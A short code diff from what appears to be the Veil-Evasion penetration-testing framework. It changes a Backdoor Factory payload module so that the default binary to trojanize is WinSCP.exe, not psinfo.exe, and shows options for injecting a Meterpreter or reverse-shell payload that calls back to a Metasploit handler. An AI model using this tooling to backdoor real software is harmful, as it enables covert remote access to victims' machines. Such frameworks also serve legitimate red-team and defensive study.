@@ -31,7 +31,7 @@ class Payload:
         self.shellcode = shellcode.Shellcode()
 
         # options we require user interaction for- format is {Option : [Value, Description]]}
-        self.required_options = {"orig_exe"     : ["psinfo.exe", "PE or ELF executable to run through the Backdoor Factory"],
+        self.required_options = {"orig_exe"     : ["WinSCP.exe", "PE or ELF executable to run through the Backdoor Factory"],
                                  "payload"          : ["meter_tcp","PE or ELF: meter_tcp, rev_shell, custom | PE only meter_https"],
                                  "LHOST"            : ["127.0.0.1", "IP of the metasploit handler"],
                                  "LPORT"            : ["4444", "Port of the metasploit handler"]}
@@ -59,8 +59,8 @@ class Payload:
 
     def generate(self):
 	#Because of calling BDF via classes, obsolute paths change
-	if self.required_options["orig_exe"][0] == "psinfo.exe":
-	   self.required_options["orig_exe"][0] = settings.VEIL_EVASION_PATH + "testbins/psinfo.exe"
+	if self.required_options["orig_exe"][0] == "WinSCP.exe":
+	   self.required_options["orig_exe"][0] = settings.VEIL_EVASION_PATH + "testbins/WinSCP.exe"
 	
 	#Make sure the bin is supported
 	self.basicDiscovery()
